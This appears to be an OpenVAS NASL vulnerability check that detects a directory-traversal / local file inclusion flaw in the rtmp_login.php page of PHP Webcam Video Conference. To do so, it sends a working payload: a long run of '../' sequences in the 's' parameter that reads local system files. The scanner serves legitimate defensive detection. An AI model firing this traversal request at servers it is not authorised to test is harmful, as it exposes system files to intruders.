###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_video_conference_lfi_02_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
#
# PHP Webcam Video Conference Local File Inclusion / XSS
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103902";

tag_insight = "Input of the 's' value in rtmp_login.php is not properly sanitized.";

tag_impact = "A remote attacker can exploit this issue to obtain sensitive
information that could aid in further attacks.";

tag_summary = "PHP Webcam Video Conferenceis prone to a directory-traversal
vulnerability because it fails to sufficiently sanitize user-supplied input.";

tag_solution = "Upgrade to the new version ifrom the videowhisper vendor homepage.";
tag_vuldetect = "Send a HTTP GET request which tries to read a local file.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 2780 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("PHP Webcam Video Conference Local File Inclusion / XSS");


 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31458/");
 
 script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
 script_tag(name:"creation_date", value:"2014-02-07 11:53:08 +0100 (Fri, 07 Feb 2014)");
 script_summary("Determine if it is possible to read a local file.");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port( default:80 );
if( ! get_port_state( port ) ) exit( 0 );

if( ! can_host_php( port:port ) ) exit( 0 );

dirs = make_list( "/vc","/vc_php","/videoconference",cgi_dirs() );

files = traversal_files();

foreach dir ( dirs )
{
  url = dir + '/index.php';
  if(http_vuln_check( port:port, url:url, pattern:"<title>Video Conference by VideoWhisper.com" ) )
  { 
    foreach file ( keys( files ) )
    {  
      url = dir + '/rtmp_login.php?s=' + crap( data:"../", length:9*9 ) + files[file]; 

      if(http_vuln_check( port:port, url:url, pattern:file ) )
      {
        security_message( port:port );
        exit( 0 );
      }
    }  
  }  
}

exit( 99 );

